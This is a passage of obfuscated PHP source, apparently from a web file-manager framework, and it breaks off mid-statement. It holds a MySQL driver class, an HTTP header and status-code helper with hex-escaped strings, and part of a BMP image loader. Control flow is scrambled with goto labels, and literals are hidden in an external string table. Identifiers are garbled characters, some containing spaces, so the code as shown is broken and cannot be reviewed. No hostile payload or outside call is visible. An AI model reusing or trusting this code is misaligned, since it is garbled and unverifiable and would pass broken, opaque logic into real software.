$CÕ‰’Å°—[$E’¼â¾¹ëŒ[13]][$E’¼â¾¹ëŒ[14]] : $this->pconnect; goto BğãéŠğØ¿; e—çŠÓ×£: if (1 != think_config($E’¼â¾¹ëŒ[18])) { unset($this->config); } goto CÉæô²÷™¸; Eõ©Æ§âÊº: mysql_query($E’¼â¾¹ëŒ[804] . think_config($E’¼â¾¹ëŒ[805]) . $E’¼â¾¹ëŒ[55], $this->linkID[$eƒµ±â‘·³]); if ($a½îî±Ìá > $E’¼â¾¹ëŒ[806]) { mysql_query($E’¼â¾¹ëŒ[807], $this->linkID[$eƒµ±â‘·³]); } $this->connected = !0; goto e—çŠÓ×£; BğãéŠğØ¿: if ($D„å•…Â¯ª) { $this->linkID[$eƒµ±â‘·³] = mysql_pconnect($d–øÁÁ„¬, $CÕ‰’Å°—[$E’¼â¾¹ëŒ[802]], $CÕ‰’Å°—[$E’¼â¾¹ëŒ[803]], 131072); } else { $this->linkID[$eƒµ±â‘·³] = mysql_connect($d–øÁÁ„¬, $CÕ‰’Å°—[$E’¼â¾¹ëŒ[802]], $CÕ‰’Å°—[$E’¼â¾¹ëŒ[803]], !0, 131072); } if (!$this->linkID[$eƒµ±â‘·³] || !empty($CÕ‰’Å°—[$E’¼â¾¹ëŒ[17]]) && !mysql_select_db($CÕ‰’Å°—[$E’¼â¾¹ëŒ[17]], $this->linkID[$eƒµ±â‘·³])) { think_exception(mysql_error()); } $a½îî±Ìá = mysql_get_server_info($this->linkID[$eƒµ±â‘·³]); goto Eõ©Æ§âÊº; CÉæô²÷™¸: } return $this->linkID[$eƒµ±â‘·³]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($bãæ»íŒÊİ) { goto e¸Ô³ÊŸâ´; e¸Ô³ÊŸâ´: $bíÑÑ”ÚÊ =& $_SERVER[Æ]; if (0 === stripos($bãæ»íŒÊİ, $bíÑÑ”ÚÊ[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto D”´í–ÏÚ•; D”´í–ÏÚ•: if (!$this->_linkID) { return !1; } $this->queryStr = $bãæ»íŒÊİ; if ($this->queryID) { $this->free(); } goto F‚ì…Ó²¤; FöÑËÉ’Ê: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto c”¥Ü¨…–ê; F‚ì…Ó²¤: think_action_status($bíÑÑ”ÚÊ[19], 1); think_status($bíÑÑ”ÚÊ[20]); $this->queryID = mysql_query($bãæ»íŒÊİ, $this->_linkID); goto FöÑËÉ’Ê; c”¥Ü¨…–ê: } public function execute($d‡˜ßœÖîõ) { goto D¨äŠîµ®¤; aÓá¥²¥³â: if (!1 === $B©‡ÑÙ³Û) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto c×œ†…Œ‰²; bŠàïÛ’Ãã: $this->queryStr = $d‡˜ßœÖîõ; if ($this->queryID) { $this->free(); } think_action_status($cè¾‘Ëù·š[21], 1); goto cˆ…‡‰Š²¤; D¨äŠîµ®¤: $cè¾‘Ëù·š =& $_SERVER[Æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bŠàïÛ’Ãã; cˆ…‡‰Š²¤: think_status($cè¾‘Ëù·š[20]); $B©‡ÑÙ³Û = mysql_query($d‡˜ßœÖîõ, $this->_linkID); $this->debug(); goto aÓá¥²¥³â; c×œ†…Œ‰²: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Æ][808], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d¿½Ÿµ‰Ğ¡ = mysql_query($_SERVER[Æ][809], $this->_linkID); $this->transTimes = 0; if (!$d¿½Ÿµ‰Ğ¡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f¾ˆ‚øô—Ó = mysql_query($_SERVER[Æ][810], $this->_linkID); $this->transTimes = 0; if (!$f¾ˆ‚øô—Ó) { $this->error(); return !1; } } return !0; } private function getAll() { $D¯êÚõ¼´ = array(); if ($this->numRows > 0) { while ($dÇ¢§Òá„ = mysql_fetch_assoc($this->queryID)) { $D¯êÚõ¼´[] = $dÇ¢§Òá„; } mysql_data_seek($this->queryID, 0); } return $D¯êÚõ¼´; } public function getFields($dèÅİ”ª ) { $f¶õÃÇÑŞ¡ =& $_SERVER[Æ]; $B¿Ø³ÓÏ¥í = $this->query($f¶õÃÇÑŞ¡[811] . $this->parseKey($dèÅİ”ª )); $d´§‚†ê±Š = array(); if ($B¿Ø³ÓÏ¥í) { foreach ($B¿Ø³ÓÏ¥í as $aƒ’Íšˆ­„ => $dÂ¦°‡íÕÌ) { $d´§‚†ê±Š[$dÂ¦°‡íÕÌ[$f¶õÃÇÑŞ¡[27]]] = array($f¶õÃÇÑŞ¡[28] => $dÂ¦°‡íÕÌ[$f¶õÃÇÑŞ¡[27]], $f¶õÃÇÑŞ¡[29] => $dÂ¦°‡íÕÌ[$f¶õÃÇÑŞ¡[30]], $f¶õÃÇÑŞ¡[31] => (bool) (strtoupper($dÂ¦°‡íÕÌ[$f¶õÃÇÑŞ¡[32]]) === $f¶õÃÇÑŞ¡[812]), $f¶õÃÇÑŞ¡[34] => $dÂ¦°‡íÕÌ[$f¶õÃÇÑŞ¡[35]], $f¶õÃÇÑŞ¡[36] => strtolower($dÂ¦°‡íÕÌ[$f¶õÃÇÑŞ¡[37]]) == $f¶õÃÇÑŞ¡[38], $f¶õÃÇÑŞ¡[39] => strtolower($dÂ¦°‡íÕÌ[$f¶õÃÇÑŞ¡[40]]) == $f¶õÃÇÑŞ¡[41]); } } return $d´§‚†ê±Š; } public function getTables($E‘¬‰È÷–Ã = '') { $Eåß×ù‚ =& $_SERVER[Æ]; if (!empty($E‘¬‰È÷–Ã)) { $dâƒÈÊ‚µ‘ = $Eåß×ù‚[813] . $E‘¬‰È÷–Ã; } else { $dâƒÈÊ‚µ‘ = $Eåß×ù‚[814]; } $Cê¬ÒåÓåº = $this->query($dâƒÈÊ‚µ‘); $c†Û³ÕâÙ = array(); foreach ($Cê¬ÒåÓåº as $e»Ş›˜ß‘ => $d¸×¸ğŠ™ã) { $c†Û³ÕâÙ[$e»Ş›˜ß‘] = current($d¸×¸ğŠ™ã); } return $c†Û³ÕâÙ; } public function replace($d±×ƒØï¿Á, $aÃ¥ùŠäö‹ = array()) { $aîñ»áÀ„ =& $_SERVER[Æ]; foreach ($d±×ƒØï¿Á as $AƒÆµèÙ…õ => $AÇÒ©íŞ¬§) { $c‰÷ê¸Ÿß = $this->parseValue($AÇÒ©íŞ¬§); if (is_scalar($c‰÷ê¸Ÿß)) { $FŒÚõ¦¦¹[] = $c‰÷ê¸Ÿß; $bŠ›´²ø¢–[] = $this->parseKey($AƒÆµèÙ…õ); } } $Bë¡Íïç£ñ = $aîñ»áÀ„[815] . $this->parseTable($aÃ¥ùŠäö‹[$aîñ»áÀ„[267]]) . $aîñ»áÀ„[816] . implode($aîñ»áÀ„[47], $bŠ›´²ø¢–) . $aîñ»áÀ„[817] . implode($aîñ»áÀ„[47], $FŒÚõ¦¦¹) . $aîñ»áÀ„[818]; return $this->execute($Bë¡Íïç£ñ); } public function insertAll($DÛÓÒ®¬øÚ, $DˆÊòÈ‰Éƒ = array(), $D÷¶ì§Ó†ğ = false) { goto DŞÓã¥ìŒ; Aù®âğ âŠ: $C«‚ÔÏàÂ = array(); foreach ($DÛÓÒ®¬øÚ as $EÒÍò–Ê¢) { $CæôÒî‹‘§ = array(); foreach ($EÒÍò–Ê¢ as $føó¡òëÄ => $e¢«ÄÅ£) { $e¢«ÄÅ£ = $this->parseValue($e¢«ÄÅ£); if (is_scalar($e¢«ÄÅ£)) { $CæôÒî‹‘§[] = $e¢«ÄÅ£; } } $C«‚ÔÏàÂ[] = $EË‹·ë£½’[248] . implode($EË‹·ë£½’[47], $CæôÒî‹‘§) . $EË‹·ë£½’[818]; } array_walk($CæË’Ê“©¤, array($this, $EË‹·ë£½’[819])); goto b·–¨ ‡Å÷; DŞÓã¥ìŒ: $EË‹·ë£½’ =& $_SERVER[Æ]; if (!is_array($DÛÓÒ®¬øÚ[0])) { return !1; } $CæË’Ê“©¤ = array_keys($DÛÓÒ®¬øÚ[0]); goto Aù®âğ âŠ; b·–¨ ‡Å÷: $c¯ñïë¸šã = ($D÷¶ì§Ó†ğ ? $EË‹·ë£½’[820] : $EË‹·ë£½’[821]) . $EË‹·ë£½’[822] . $this->parseTable($DˆÊòÈ‰Éƒ[$EË‹·ë£½’[267]]) . $EË‹·ë£½’[816] . implode($EË‹·ë£½’[47], $CæË’Ê“©¤) . $EË‹·ë£½’[823] . implode($EË‹·ë£½’[47], $C«‚ÔÏàÂ); return $this->execute($c¯ñïë¸šã); goto f”œ“¼í¬²; f”œ“¼í¬²: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $f «Ô°…àí =& $_SERVER[Æ]; $this->error = mysql_errno() . $f «Ô°…àí[4] . mysql_error($this->_linkID); if ($f «Ô°…àí[33] != $this->queryStr) { $this->error .= LNG($f «Ô°…àí[45]) . $this->queryStr; } think_trace($this->error, $f «Ô°…àí[33], $f «Ô°…àí[46]); return $this->error; } public function escapeString($FìÕ¯÷³Ô’) { if ($this->_linkID) { return mysql_real_escape_string($FìÕ¯÷³Ô’, $this->_linkID); } else { return mysql_escape_string($FìÕ¯÷³Ô’); } } public function parseKey(&$a±¤¢àõ„ñ, $bÏØÅ³‘á = true) { $aô‡Å÷ŒåÖ =& $_SERVER[Æ]; if ($bÏØÅ³‘á) { $a±¤¢àõ„ñ = $this->parseKeyCheck($a±¤¢àõ„ñ); } if ($a±¤¢àõ„ñ != $aô‡Å÷ŒåÖ[176] && !preg_match($aô‡Å÷ŒåÖ[824], $a±¤¢àõ„ñ)) { $a±¤¢àõ„ñ = $aô‡Å÷ŒåÖ[825] . trim($a±¤¢àõ„ñ, $aô‡Å÷ŒåÖ[825]) . $aô‡Å÷ŒåÖ[825]; } return $a±¤¢àõ„ñ; } } goto e­¢è‰Ã; e¢ëÊ§ñèİ: function beforeShutdown() { Hook::trigger($_SERVER[ş”][36]); } $_SERVER[$_SERVER[ş”][37]] = BASIC_PATH; $_SERVER[$_SERVER[ş”][38]] = LIB_DIR; goto fÇÌÇŒÆÖ; f»ñöÔ×ç: class HttpHeader { public static $_headers = array("\x48\x6f\163\164" => "\x48\x54\124\x50\x5f\110\117\x53\x54", "\125\163\145\162\x2d\101\147\x65\x6e\x74" => "\x48\x54\124\x50\x5f\x55\x53\105\x52\137\101\x47\105\x4e\x54", "\103\x6f\x6e\x74\145\x6e\x74\x2d\x54\171\160\145" => "\110\124\x54\x50\137\x43\117\116\x54\105\116\124\x5f\124\x59\x50\105", "\x43\x6f\156\164\145\x6e\x74\55\x4c\x65\x6e\147\x74\150" => "\110\x54\x54\120\x5f\x43\x4f\116\124\x45\x4e\124\x5f\x4c\105\x4e\x47\124\110", "\x44\x65\x70\x74\x68" => "\110\x54\x54\x50\137\x44\x45\x50\124\110", "\x45\170\160\x65\x63\164" => "\x48\124\124\x50\137\105\130\x50\105\103\x54", "\x49\146\55\x4e\x6f\156\145\55\x4d\x61\164\143\x68" => "\110\x54\124\120\x5f\111\x46\137\116\117\116\x45\x5f\x4d\101\124\103\110", "\111\146\x2d\115\141\164\143\150" => "\x48\x54\x54\120\137\111\x46\x5f\x4d\101\124\x43\110", "\111\x66\55\x52\x61\156\147\x65" => "\x48\124\x54\120\137\111\106\137\x52\x41\x4e\107\105", "\x4c\141\x73\164\x2d\115\x6f\x64\151\x66\x69\145\x64" => "\110\x54\x54\120\137\114\x41\x53\124\x5f\x4d\x4f\x44\x49\106\x49\105\x44", "\x49\146\x2d\115\157\x64\x69\146\x69\x65\x64\55\x53\151\x6e\143\145" => "\110\124\x54\x50\x5f\x49\x46\137\x4d\x4f\x44\111\x46\111\105\x44\x5f\x53\111\x4e\103\x45", "\x49\x66\x2d\x55\x6e\155\x6f\144\x69\x66\x69\145\x64\x2d\123\151\156\143\x65" => "\110\124\x54\120\x5f\111\x46\x5f\x55\116\x4d\x4f\104\x49\x46\x49\x45\x44\137\x53\111\116\103\105", "\122\x61\x6e\x67\x65" => "\110\124\x54\120\137\122\x41\116\x47\x45", "\124\x69\x6d\x65\x6f\165\164" => "\110\x54\x54\x50\x5f\124\111\x4d\105\117\x55\124", "\x49\146" => "\x48\124\124\x50\x5f\x49\106", "\114\x6f\x63\x6b\55\x54\x6f\x6b\x65\x6e" => "\110\x54\x54\x50\x5f\x4c\x4f\x43\113\137\124\x4f\x4b\105\x4e", "\117\166\145\162\x77\x72\x69\x74\x65" => "\110\124\x54\120\x5f\x4f\126\x45\x52\x57\122\x49\124\105", "\104\145\163\164\x69\x6e\x61\x74\151\x6f\x6e" => "\110\x54\124\120\x5f\x44\105\123\124\x49\x4e\x41\x54\111\117\116", "\122\145\x71\x75\x65\163\164\55\111\144" => "\122\105\x51\x55\105\x53\x54\x5f\x49\x44", "\122\145\161\165\x65\x73\164\x2d\102\157\x64\x79\55\x46\x69\154\145" => "\122\105\x51\x55\x45\x53\124\137\102\x4f\x44\131\137\x46\x49\x4c\x45", "\x52\x65\x64\151\162\x65\143\x74\x2d\123\x74\141\x74\x75\163" => "\x52\105\104\111\122\x45\x43\x54\137\123\x54\101\x54\x55\123"); public static function init() { static $dšô„—ëñ = false; if ($dšô„—ëñ) { return; } foreach ($_SERVER as $aÎªèãˆÜÓ => $B„ÑÎ¥ˆÆ”) { $aÎªèãˆÜÓ = strtoupper($aÎªèãˆÜÓ); if (!array_key_exists($aÎªèãˆÜÓ, $_SERVER)) { continue; } $_SERVER[$aÎªèãˆÜÓ] = $B„ÑÎ¥ˆÆ”; } foreach (self::$_headers as $aÎªèãˆÜÓ => $F‡ö¹‹—îª) { if (!array_key_exists($aÎªèãˆÜÓ, $_SERVER)) { continue; } $_SERVER[$aÎªèãˆÜÓ] = $_SERVER[$F‡ö¹‹—îª]; $_SERVER[strtoupper($aÎªèãˆÜÓ)] = $_SERVER[$F‡ö¹‹—îª]; } } public static function get($DğóŠÍ‘¸ø) { self::init(); return $_SERVER[$DğóŠÍ‘¸ø] ? $_SERVER[$DğóŠÍ‘¸ø] : $_SERVER[$_SERVER[Æ][1826] . strtoupper($DğóŠÍ‘¸ø)]; } public static function method() { return strtoupper(self::get($_SERVER[Æ][154])); } public static function length() { $EØôÓ¼œ¾ =& $_SERVER[Æ]; $E°‚æÄ¼é = self::get($EØôÓ¼œ¾[1827]); if (!$E°‚æÄ¼é) { $E°‚æÄ¼é = self::get($EØôÓ¼œ¾[1145]); } return $E°‚æÄ¼é; } public static function range() { $eÓ™³´Õˆ· =& $_SERVER[Æ]; $EğÇ½¢İ‰÷ = self::get($eÓ™³´Õˆ·[198]); if (!$EğÇ½¢İ‰÷) { return !1; } if (!preg_match($eÓ™³´Õˆ·[1828], $EğÇ½¢İ‰÷, $CãŸĞ¤á‘©)) { return !1; } if ($CãŸĞ¤á‘©[1] === $eÓ™³´Õˆ·[33] && $CãŸĞ¤á‘©[2] === $eÓ™³´Õˆ·[33]) { return !1; } return array($CãŸĞ¤á‘©[1] !== $eÓ™³´Õˆ·[33] ? $CãŸĞ¤á‘©[1] : null, $CãŸĞ¤á‘©[2] !== $eÓ™³´Õˆ·[33] ? $CãŸĞ¤á‘©[2] : null); } public static $statusCode = array("\x31\60\x30" => "\x43\157\156\x74\151\x6e\165\145", "\x31\x30\61" => "\123\167\x69\164\x63\x68\151\156\147\x20\120\162\157\164\x6f\143\x6f\x6c", "\x31\x30\62" => "\x50\x72\x6f\x63\x65\163\x73\x69\156\x67", "\x31\60\63" => "\105\x61\162\154\171\40\110\x69\156\x74\163", "\62\60\60" => "\x4f\x4b", "\x32\x30\x31" => "\x43\x72\x65\x61\164\145\x64", "\62\60\62" => "\x41\143\x63\145\x70\x74\145\x64", "\62\x30\63" => "\x4e\x6f\156\x2d\x41\165\x74\150\157\x72\x69\x74\141\164\x69\x76\x65\40\x49\x6e\146\x6f\162\x6d\141\164\x69\157\156", "\62\x30\x34" => "\x4e\157\x20\x43\x6f\156\164\x65\x6e\x74", "\62\x30\65" => "\122\x65\x73\x65\164\x20\103\157\156\164\145\x6e\164", "\62\x30\66" => "\x50\141\x72\164\x69\141\x6c\x20\103\157\156\x74\145\x6e\164", "\x32\60\x37" => "\x4d\x75\154\x74\151\55\123\x74\x61\x74\x75\163", "\x33\60\x30" => "\x4d\x75\154\164\x69\160\154\x65\40\x43\150\157\151\143\145\x73", "\63\60\61" => "\x4d\x6f\x76\145\144\x20\120\x65\x72\x6d\x61\156\x65\x6e\x74\154\171", "\63\x30\x32" => "\106\157\x75\x6e\x64", "\x33\x30\63" => "\x53\x65\x65\x20\117\x74\150\145\162", "\x33\60\x34" => "\116\157\164\40\x4d\x6f\x64\151\x66\x69\x65\144", "\x33\x30\x35" => "\x55\x73\x65\40\x50\162\x6f\170\171", "\63\60\67" => "\x54\x65\x6d\x70\x6f\x72\x61\162\171\40\x52\145\x64\x69\162\145\143\164", "\63\60\70" => "\x50\x65\x72\155\x61\x6e\x65\x6e\x74\x20\x52\x65\144\x69\162\145\x63\x74", "\64\60\60" => "\x42\x61\x64\x20\x52\x65\161\x75\145\x73\164", "\x34\x30\x31" => "\x55\156\x61\165\164\150\157\x72\x69\x7a\145\x64", "\64\60\62" => "\120\x61\171\x6d\145\156\x74\x20\122\x65\x71\165\151\x72\x65\x64", "\x34\x30\63" => "\x46\157\162\x62\x69\144\x64\x65\x6e", "\64\60\64" => "\116\157\164\x20\106\x6f\x75\x6e\x64", "\64\60\65" => "\x4d\145\x74\x68\x6f\144\x20\116\x6f\164\x20\x41\154\154\x6f\167\145\x64", "\64\x30\x36" => "\x4e\x6f\x74\x20\x41\143\x63\x65\x70\164\x61\142\x6c\145", "\64\x30\67" => "\x50\x72\157\170\x79\x20\101\165\164\x68\145\156\x74\x69\x63\x61\x74\151\157\156\x20\x52\x65\x71\x75\x69\162\145\x64", "\x34\x30\x38" => "\x52\145\x71\x75\145\x73\x74\40\124\151\x6d\145\157\x75\164", "\x34\x30\71" => "\x43\157\156\146\154\151\x63\164", "\64\x31\x30" => "\107\x6f\156\x65", "\x34\x31\61" => "\114\145\156\147\164\150\40\x52\145\x71\x75\x69\x72\145\x64", "\x34\61\x32" => "\x50\162\x65\143\157\156\144\151\164\151\x6f\x6e\40\x46\x61\x69\x6c\145\144", "\x34\61\x33" => "\x52\x65\161\165\x65\163\x74\x20\x45\156\x74\x69\164\171\x20\x54\157\x6f\40\114\141\x72\147\x65", "\64\x31\64" => "\x52\x65\x71\165\145\x73\x74\x20\125\x52\111\x20\x54\x6f\x6f\x20\x4c\141\162\147\x65", "\64\61\x35" => "\x55\x6e\x73\x75\160\160\157\x72\x74\145\x64\40\115\145\144\x69\141\40\124\x79\160\x65", "\64\x31\66" => "\122\145\161\x75\x65\x73\164\145\144\40\122\141\x6e\147\x65\x20\116\x6f\x74\x20\x53\x61\164\151\x73\x66\151\141\x62\x6c\145", "\x34\61\67" => "\105\x78\160\x65\143\164\x61\164\151\157\156\x20\x46\141\151\154\x65\144", "\64\x32\x32" => "\x55\156\160\162\157\x63\x65\163\163\x61\x62\154\145\40\x45\x6e\x74\x69\x74\171", "\64\62\x33" => "\x4c\x6f\143\153\145\x64", "\x34\62\x34" => "\x46\x61\x69\x6c\145\144\x20\104\x65\x70\145\x6e\x64\x65\156\x63\171", "\x34\62\65" => "\x55\x6e\157\162\144\145\x72\145\144\40\x43\157\x6c\154\x65\143\164\151\x6f\156", "\64\x32\x36" => "\125\160\147\x72\141\x64\x65\40\122\145\x71\165\x69\x72\145\x64", "\64\62\70" => "\120\162\145\x63\x6f\156\x64\151\x74\x69\157\156\40\122\x65\x71\x75\x69\x72\x65\x64", "\x34\62\71" => "\x54\157\x6f\40\x4d\141\x6e\171\40\x52\x65\x71\165\x65\x73\164\163", "\64\63\61" => "\122\145\161\x75\145\x73\164\40\110\145\x61\144\145\x72\40\106\x69\x65\x6c\x64\163\x20\124\x6f\157\x20\114\141\162\x67\145", "\x34\x34\x34" => "\116\157\x20\122\145\x73\x70\x6f\156\163\145", "\64\x35\x30" => "\x42\154\x6f\143\153\x65\144\x20\142\x79\x20\x57\151\156\144\157\x77\x73\40\x50\x61\x72\145\x6e\164\x61\x6c\40\103\x6f\156\164\x72\x6f\154\163", "\x34\65\61" => "\125\x6e\x61\166\141\151\154\141\x62\x6c\145\40\x46\x6f\x72\x20\x4c\145\147\141\154\x20\122\x65\141\163\157\156\163", "\64\x39\64" => "\x52\x65\161\x75\145\163\164\x20\110\145\141\144\x65\162\x20\124\x6f\157\40\114\141\x72\x67\x65", "\x35\60\x30" => "\x49\156\x74\x65\x72\x6e\x61\x6c\40\x53\145\162\166\145\x72\x20\105\x72\x72\157\162", "\65\x30\x31" => "\116\157\164\40\x49\x6d\x70\154\145\x6d\x65\156\x74\x65\144", "\65\x30\62" => "\x42\141\x64\x20\x47\x61\x74\x65\167\141\171", "\65\60\63" => "\x53\145\x72\166\x69\x63\x65\40\x55\x6e\141\166\141\x69\154\141\142\154\x65", "\x35\x30\64" => "\107\x61\x74\x65\x77\x61\x79\40\x54\x69\155\x65\157\x75\x74", "\65\x30\65" => "\110\x54\124\x50\x20\x56\x65\x72\x73\x69\157\x6e\40\x6e\x6f\x74\40\163\165\160\160\x6f\x72\164\x65\x64", "\x35\60\x37" => "\111\156\x73\x75\146\x66\151\143\151\x65\156\164\x20\123\x74\157\162\x61\x67\x65"); public static function code($f”¿×‰½È©) { $EÜŠ‰Ğµ›ç =& $_SERVER[Æ]; $f”¿×‰½È© = $f”¿×‰½È© . $EÜŠ‰Ğµ›ç[33]; $b…”°ØˆĞ = self::$statusCode[$f”¿×‰½È©]; $b…”°ØˆĞ = $b…”°ØˆĞ ? "\x48\x54\124\120\x2f\x31\56\x31\40{$f”¿×‰½È©}\40" . $b…”°ØˆĞ : $EÜŠ‰Ğµ›ç[33]; return $b…”°ØˆĞ; } } class ImageGdBMP { public static function load($B˜å“ˆàÈ¯) { $BÊÌéÁ„¤ë = fopen($B˜å“ˆàÈ¯, $_SERVER[Æ][1518]); if ($BÊÌéÁ„¤ë === !1) { return !1; } $F‡Î†¶•·ˆ = self::loadFromStream($BÊÌéÁ„¤ë); fclose($BÊÌéÁ„¤ë); return $F‡Î†¶•·ˆ; } public static function loadFromStream($eŒ’Ğøê¸) { $AĞŒÈ¶ªõÌ =& $_SERVER[Æ]; $aíˆ¸åÏÑì = fread($eŒ’Ğøê¸, 14); if ($aíˆ¸åÏÑì === !1) { return !1; } if ($aíˆ¸åÏÑì[0] != $AĞŒÈ¶ªõÌ[1829] || $aíˆ¸åÏÑì[1] != $AĞŒÈ¶ªõÌ[1830]) { return !1; } $f¹à›Î¬Š = unpack($AĞŒÈ¶ªõÌ[1831] . $AĞŒÈ¶ªõÌ[1832] . $AĞŒÈ¶ªõÌ[1833] . $AĞŒÈ¶ªõÌ[1834] . $AĞŒÈ¶ªõÌ[1835], $aíˆ¸åÏÑì); return self::loadFromStreamAndFileHeader($eŒ’Ğøê¸, $f¹à›Î¬Š); } public static function loadFromStreamAndFileHeader($e­ğ÷œİñ, array $BÛ›„óº¯ğ) { goto c”ï›‹§ø; B“œ‚ø›˜ç: $aÌ£Û‡„ˆ‰ = abs($c–ëä½±„º); $d„ÈŸ†ÖÁ¤ = $c–ëä½±„º > 0 ? $aÌ£Û‡„ˆ‰ - 1 : 0; $D–¹‚ÔÊ„  = $c–ëä½±„º > 0 ? -1 : 1; goto cØ£Şñå˜æ; Ağ´°ºà›: if ($Fö´£Ú¿è¬ == 0 || $c–ëä½±„º == 0 || $CŞ¸‰£‡é != 1 || ($fîî¤î¡øÏ & $e¦æÊ•ç™ ) != 0 || ($fîî¤î¡øÏ & $fœõáË´Œº) != 0 || ($fîî¤î¡øÏ & $c­Ç‘›øåé) != 0 || ($e¦æÊ•ç™  & $fœõáË´Œº) != 0 || ($e¦æÊ•ç™  & $c­Ç‘›øåé) != 0 || ($fœõáË´Œº & $c­Ç‘›øåé) != 0) { return !1; } if ($DÔÑˆŠÛ§Õ == 4 || $DÔÑˆŠÛ§Õ == 5) { $AøµÃ†¥… = stream_get_contents($e­ğ÷œİñ, $B£±³±ò»ƒ); if ($AøµÃ†¥… === !1) { return !1; } return imagecreatefromstring($AøµÃ†¥…); } $DŒáƒéšø = $Fö´£Ú¿è¬ * $fœÓ¬ãÑï¥ + 31 >> 3 & ~3; goto B“œ‚ø›˜ç; fÛ¬¢÷Ş­Ï: if ($AøµÃ†¥… === !1) { return !1; } list(, $f¬»ÔÖ±öõ) = unpack($dô…™ì˜×[1836], $AøµÃ†¥…); if ($f¬»ÔÖ±öõ == 12) { goto BâÀ—ˆ”’; f¨È†ƒù¡ï: $e¥¤½Â¾® = $dÂ‘å‡¥‡® = $fîî¤î¡øÏ = $DÔÑˆŠÛ§Õ = 0; $e¦æÊ•ç™  = 16711680; $fœõáË´Œº = 65280; goto cÇù–î›§; cÇù–î›§: $c­Ç‘›øåé = 255; goto eä‡Ğ™…Œ; BâÀ—ˆ”’: $AøµÃ†¥… = fread($e­ğ÷œİñ, $f¬»ÔÖ±öõ - 4); if ($AøµÃ†¥… === !1) { return !1; } extract(unpack($dô…™ì˜×[1837] . $dô…™ì˜×[1838] . $dô…™ì˜×[1839] . $dô…™ì˜×[1840], $AøµÃ†¥…)); goto f¨È†ƒù¡ï; eä‡Ğ™…Œ: } else { if (124 < $f¬»ÔÖ±öõ || $f¬»ÔÖ±öõ < 40) { return !1; } else { goto BÂÙçÖÏœ; dôò Ç•ÕŠ: if ($Fö´£Ú¿è¬ & 2147483648) { $Fö´£Ú¿è¬ = -(~$Fö´£Ú¿è¬ & 4294967295) - 1; } if ($c–ëä½±„º & 2147483648) { $c–ëä½±„º = -(~$c–ëä½±„º & 4294967295) - 1; } if ($Dù‘¼®Ø & 2147483648) { $Dù‘¼®Ø = -(~$Dù‘¼®Ø & 4294967295) - 1; } goto C× ŸáŠŞ; BÂÙçÖÏœ: $AøµÃ†¥… = fread($e­ğ÷œİñ, 36); if ($AøµÃ†¥… === !1) { return !1; } extract(unpack($dô…™ì˜×[1841] . $dô…™ì˜×[1842] . $dô…™ì˜×[1839] . $dô…™ì˜×[1843] . $dô…™ì˜×[1844] . $dô…™ì˜×[1845] . $dô…™ì˜×[1846] . $dô…™ì˜×[1847] . $dô…™ì˜×[1848] . $dô…™ì˜×[1849], $AøµÃ†¥…)); goto dôò Ç•ÕŠ; cÚáÀºì: if (($fœÓ¬ãÑï¥ == 16 || $fœÓ¬ãÑï¥ == 24 || $fœÓ¬ãÑï¥ == 32) && $DÔÑˆŠÛ§Õ == 0 && $e¦æÊ•ç™  == 0 && $fœõáË´Œº == 0 && $c­Ç‘›øåé == 0) { switch ($fœÓ¬ãÑï¥) { case 16: $e¦æÊ•ç™  = 31744; $fœõáË´Œº = 992; $c­Ç‘›øåé = 31; break; case 24: case 32: $e¦æÊ•ç™  = 16711680; $fœõáË´Œº = 65280; $c­Ç‘›øåé = 255; break; } } goto dó‰«ëÁÏ; C× ŸáŠŞ: if ($C¸î¦ÒÓÓ‚ & 2147483648) { $C¸î¦ÒÓÓ‚ = -(~$C¸î¦ÒÓÓ‚ & 4294967295) - 1; } if ($BÛ›„óº¯ğ[$dô…™ì˜×[520]] != 0) { $B‰œíçõè³ = $fœÓ¬ãÑï¥ == 1 || $fœÓ¬ãÑï¥ == 4 || $fœÓ¬ãÑï¥ == 8 ? ($e¥¤½Â¾® ? $e¥¤½Â¾® : pow(2, $fœÓ¬ãÑï¥)) << 2 : 0; $d§íÎ‹äå‘ = $B£±³±ò»ƒ ? $B£±³±ò»ƒ : ($Fö´£Ú¿è¬ * $fœÓ¬ãÑï¥ + 31 >> 3 & ~3) * abs($c–ëä½±„º); $F¯ÑŠÂ¹Š = $BÛ›„óº¯ğ[$dô…™ì˜×[520]] - $d§íÎ‹äå‘ - $B‰œíçõè³ - 14; if ($f¬»ÔÖ±öõ < $F¯ÑŠÂ¹Š && 40 <= $f¬»ÔÖ±öõ && $f¬»ÔÖ±öõ <= 124) { $f¬»ÔÖ±öõ = $F¯ÑŠÂ¹Š; } } if ($f¬»ÔÖ±öõ - 40 > 0) { $AøµÃ†¥… = fread($e­ğ÷œİñ, $f¬»ÔÖ±öõ - 40); if ($AøµÃ†¥… === !1) { return !1; } extract(unpack($dô…™ì˜×[1850] . $dô…™ì˜×[1851] . $dô…™ì˜×[1852] . $dô…™ì˜×[1853], $AøµÃ†¥… . str_repeat($dô…™ì˜×[1854], 120))); } else { $fîî¤î¡øÏ = $e¦æÊ•ç™  = $fœõáË´Œº = $c­Ç‘›øåé = 0; } goto cÚáÀºì; dó‰«ëÁÏ: } } goto Ağ´°ºà›; cØ£Şñå˜æ: if ($fœÓ¬ãÑï¥ == 1 || $fœÓ¬ãÑï¥ == 4 || $fœÓ¬ãÑï¥ == 8) { goto b„ÛÍ¤åÚÓ; b„ÛÍ¤åÚÓ: $BÅµİÜº‹á = imagecreate($Fö´£Ú¿è¬, $aÌ£Û‡„ˆ‰); $fÙ¿Í¶Ò¸è = $f¬»ÔÖ±öõ == 12 ? 3 : 4; $Fœ‡Ìéˆ¬ê = $e¥¤½Â¾® ? $e¥¤½Â¾® : pow(2, $fœÓ¬ãÑï¥); goto dÃÑøÆ”Æ‹; DÍöÛÍ…ÕĞ: $fÃ’³—­æé = (1 << $fœÓ¬ãÑï¥) - 1 << $bªÌŸŠ©ÙŸ; if 